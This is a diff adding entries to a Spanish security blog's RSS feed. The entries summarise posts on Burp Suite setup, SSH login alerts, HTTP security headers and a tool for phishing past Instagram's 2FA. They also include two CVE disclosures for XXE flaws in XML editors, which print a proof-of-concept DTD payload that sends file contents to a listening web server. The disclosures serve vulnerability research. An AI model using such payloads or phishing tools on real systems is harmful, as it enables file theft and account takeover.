@@ -217,6 +217,152 @@
     </item>
     
     <item>
+      <title>Enviar tráfico de Burp Suite a través de VPS</title>
+      <link>http://localhost:1313/es/posts/enviar-trafico-de-burp-suite-a-traves-de-vps/</link>
+      <pubDate>Mon, 13 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/enviar-trafico-de-burp-suite-a-traves-de-vps/</guid>
+      
+      <description>&lt;p&gt;Cuando estamos auditando una aplicación externa con Burp Suite, podemos encontrarnos en un entorno con restricciones de red, por ejemplo, un firewall podría interferir en nuestros paquetes y descartarlos o modificarlos, lo que daría como resultado falsos positivos o la anulación de ciertas pruebas de seguridad.&lt;/p&gt;
+&lt;p&gt;En esta entrada, veremos como &lt;strong&gt;enviar el tráfico del proxy de Burp Suite a través de una máquina linux en la nube (VPS)&lt;/strong&gt; para evitar estos problemas u otros similares.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Creación de un bot en Telegram para notificar conexiones por SSH</title>
+      <link>http://localhost:1313/es/posts/creacion-de-un-bot-en-telegram-para-notificar-conexiones-por-ssh/</link>
+      <pubDate>Thu, 09 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/creacion-de-un-bot-en-telegram-para-notificar-conexiones-por-ssh/</guid>
+      
+      <description>&lt;p&gt;Ahora que estamos más tiempo en casa debido a la situación excepcional que vivimos a causa del Covid-19, podemos aprovechar e intentar agregar algún tipo de seguridad en nuestra red interna, por eso pense en escribir este breve post, tan sencillo como útil… la de notificarnos cuando alguien accede a uno de nuestros dispositivos.&lt;/p&gt;
+&lt;p&gt;En este artículo, vamos a crear un bot de Telegram que nos avise cada vez que se inicie sesión por SSH en alguno de nuestros dispositivos (para este ejemplo, usaré mi Raspberry).&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Añadir CA de Burp Suite al almacén de certificados de Kali Linux</title>
+      <link>http://localhost:1313/es/posts/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux/</link>
+      <pubDate>Sun, 29 Mar 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux/</guid>
+      
+      <description>&lt;p&gt;Durante un programa privado de bug bounty, estuve utilizando las herramientas cURL, gobuster y sqlmap a través del proxy de Burp Suite. Como siempre y por vagancia, configuraba las herramientas para que ignoraran el certificado de PortSwigger (por ejemplo, la opción &lt;code&gt;-k&lt;/code&gt; en cURL).&lt;/p&gt;
+&lt;p&gt;En caso de no añadir opciones de ignorar certificados a nuestras herramientas, podemos obtener errores del tipo &lt;strong&gt;SSL certificate problem&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://localhost:1313/images/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux_001.png&#34;&gt;&lt;img src=&#34;http://localhost:1313/images/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux_001.png&#34; alt=&#34;/images/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux/anadir-ca-de-burp-suite-al-almacen-de-certificados-de-kali-linux_001.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Error de certificado al usar cURL a través del proxy de Burp Suite&lt;/em&gt;&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Evasión del doble factor de autenticación en Instagram</title>
+      <link>http://localhost:1313/es/posts/evasion-del-doble-factor-de-autenticacion-en-instagram/</link>
+      <pubDate>Sun, 19 Jan 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/evasion-del-doble-factor-de-autenticacion-en-instagram/</guid>
+      
+      <description>&lt;p&gt;El &lt;strong&gt;doble factor de autenticación&lt;/strong&gt; (2FA) es una capa adicional de seguridad para proteger las cuentas de los usuarios en diferentes servicios de Internet. Muchas personas piensan que al tener habilitada esta característica sus cuentas están completamente protegidas, pero esto no es así.&lt;/p&gt;
+&lt;p&gt;Hace unos meses escribí una &lt;a href=&#34;https://hackpuntes.com/suplantacion-de-cuentas-de-gmail-con-2fa/&#34;&gt;entrada&lt;/a&gt; de cómo se realizaría el proceso de ataque para evadir el &lt;strong&gt;2FA&lt;/strong&gt; en el servicio de &lt;strong&gt;Gmail&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;En este caso, he preparado una herramienta similar a &lt;a href=&#34;https://github.com/afernandezb92/2FAGmailPhising&#34;&gt;2FAGmailPhishing&lt;/a&gt; pero para el servicio de &lt;strong&gt;Instagram&lt;/strong&gt;.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Seguimiento y análisis de un correo electrónico sospechoso</title>
+      <link>http://localhost:1313/es/posts/seguimiento-y-analisis-de-un-correo-electronico-sospechoso/</link>
+      <pubDate>Mon, 23 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/seguimiento-y-analisis-de-un-correo-electronico-sospechoso/</guid>
+      
+      <description>&lt;p&gt;En este post vamos a intentar explicar de manera resumida cómo se puede realizar un seguimiento de un correo electrónico sospechoso (Este caso es real y se han anonimizado todos los datos).&lt;/p&gt;
+&lt;p&gt;Para llevar a cabo este laboratorio, se han utilizado las siguientes herramientas:&lt;/p&gt;
+&lt;p&gt;MxToolboox (Analyzer Headers)&lt;/p&gt;
+&lt;p&gt;Whois&lt;/p&gt;
+&lt;p&gt;Microsoft Outlook&lt;/p&gt;
+&lt;p&gt;Buscadores de Internet&lt;/p&gt;
+&lt;p&gt;Ahora vamos a explicar lo ocurrido.&lt;/p&gt;
+&lt;p&gt;Un cliente se pone en contacto con nosotros, indicando que ha recibido un correo sospechoso, por lo que le solicitamos que envíe adjunto el correo original (formato .msg).&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Cabeceras de seguridad HTTP</title>
+      <link>http://localhost:1313/es/posts/cabeceras-de-seguridad-http/</link>
+      <pubDate>Wed, 11 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/cabeceras-de-seguridad-http/</guid>
+      
+      <description>&lt;p&gt;Las &lt;strong&gt;Cabeceras HTTP&lt;/strong&gt; son parámetros que se envían en una petición o respuesta HTTP entre el cliente y el servidor para proporcionar información esencial sobre la transacción que se esté llevando a cabo. Estas cabeceras siempre utilizan la sintaxis &lt;strong&gt;«Cabecera: Valor»&lt;/strong&gt; y a continuación veremos cuales son las &lt;strong&gt;cabeceras de respuesta&lt;/strong&gt; más importantes enfocándonos en la seguridad.&lt;/p&gt;
+&lt;h2 id=&#34;http-strict-transport-security-hsts&#34;&gt;HTTP Strict Transport Security (HSTS)&lt;/h2&gt;
+&lt;p&gt;Esta cabecera permite indicar a un navegador que &lt;strong&gt;siempre&lt;/strong&gt; se utilice el protocolo HTTPS para establecer la comunicación entre el cliente y servidor (en lugar de HTTP). Esto significa que cualquier marcador, enlace, recurso o dirección forzará a los usuarios a hacer uso de HTTPS, inclusive si el propio usuario especifica el uso de HTTP.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>CVE-2019-19032 XMLBlueprint &lt;= 16.191112 - Inyección XML (XXE)</title>
+      <link>http://localhost:1313/es/posts/cve-2019-19032-xmlblueprint-16-191112-inyeccion-xml/</link>
+      <pubDate>Mon, 25 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/cve-2019-19032-xmlblueprint-16-191112-inyeccion-xml/</guid>
+      
+      <description>&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;
+&lt;p&gt;Se ha detectado una vulnerabilidad de &lt;strong&gt;&lt;a href=&#34;https://www.owasp.org/index.php/XML_External_Entity_%5C%28XXE%5C%29_Processing&#34;&gt;inyección XML&lt;/a&gt;&lt;/strong&gt; (XXE) basada en entidades externas (DTD) en el software &lt;a href=&#34;https://www.xmlblueprint.com/documents/xmlblueprint-16.191112.exe&#34;&gt;&lt;strong&gt;XMLBlueprint versión 16.191112&lt;/strong&gt;&lt;/a&gt; y posiblemente anteriores. Esta vulnerabilidad está asociada al &lt;strong&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19032&#34;&gt;CVE-2019-19032&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;impacto&#34;&gt;Impacto&lt;/h2&gt;
+&lt;p&gt;Un usuario malintencionado, podría generar un archivo XML malicioso con la intención de causar una &lt;strong&gt;denegación de servicio a la aplicación o leer archivos arbitrarios&lt;/strong&gt; del sistema.&lt;/p&gt;
+&lt;h2 id=&#34;prueba-de-concepto&#34;&gt;Prueba de concepto&lt;/h2&gt;
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
+      &lt;iframe allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen=&#34;allowfullscreen&#34; loading=&#34;eager&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; src=&#34;https://www.youtube.com/embed/N6cpCPwm8ys?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; title=&#34;YouTube video&#34;&gt;&lt;/iframe&gt;
+    &lt;/div&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Iniciar un servidor web.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python -m SimpleHTTPServer 80
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Subir el siguiente archivo &lt;strong&gt;payload.dtd&lt;/strong&gt; al servidor.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&amp;lt;!ENTITY % all &amp;#34;&amp;lt;!ENTITY send SYSTEM &amp;#39;http://localhost:80/?%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt;
+%all;
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;Crear un archivo de texto &lt;strong&gt;(secret.txt)&lt;/strong&gt; en el escritorio con cualquier contenido.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>CVE-2019-19031 Easy XML Editor &lt;= 1.7.8 - Inyección XML</title>
+      <link>http://localhost:1313/es/posts/cve-2019-19031-easy-xml-editor-1-7-8-inyeccion-xml/</link>
+      <pubDate>Fri, 22 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/cve-2019-19031-easy-xml-editor-1-7-8-inyeccion-xml/</guid>
+      
+      <description>&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;
+&lt;p&gt;Se ha detectado una vulnerabilidad de &lt;strong&gt;&lt;a href=&#34;https://www.owasp.org/index.php/XML_External_Entity_%5C%28XXE%5C%29_Processing&#34;&gt;inyección XML&lt;/a&gt;&lt;/strong&gt; basada en entidades externas (DTD) en el software &lt;strong&gt;&lt;a href=&#34;https://www.edit-xml.com/Easy_XML_Editor.exe&#34;&gt;Easy XML Editor versión 1.7.8&lt;/a&gt;&lt;/strong&gt; y posiblemente anteriores. Esta vulnerabilidad está asociada al &lt;strong&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19031&#34;&gt;CVE-2019-19031&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;impacto&#34;&gt;Impacto&lt;/h2&gt;
+&lt;p&gt;Un usuario malintencionado, podría generar un archivo XML malicioso con la intención de causar una &lt;strong&gt;denegación de servicio a la aplicación o leer archivos arbitrarios&lt;/strong&gt; del sistema.&lt;/p&gt;
+&lt;h2 id=&#34;prueba-de-concepto&#34;&gt;Prueba de concepto&lt;/h2&gt;
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
+      &lt;iframe allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen=&#34;allowfullscreen&#34; loading=&#34;eager&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; src=&#34;https://www.youtube.com/embed/DXssm4Ll-EE?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; title=&#34;YouTube video&#34;&gt;&lt;/iframe&gt;
+    &lt;/div&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Iniciar un servidor web.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python -m SimpleHTTPServer 80
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Subir el siguiente archivo &lt;strong&gt;payload.dtd&lt;/strong&gt; al servidor.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&amp;lt;!ENTITY % all &amp;#34;&amp;lt;!ENTITY send SYSTEM &amp;#39;http://localhost:80/?%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt;
+%all;
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;Crear un archivo de texto &lt;strong&gt;(secret.txt)&lt;/strong&gt; en el escritorio con cualquier contenido.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
       <title>Hackpuntes Newsletter #3</title>
       <link>http://localhost:1313/es/posts/hackpuntes-newsletter-3/</link>
       <pubDate>Mon, 21 Oct 2019 00:00:00 +0000</pubDate>
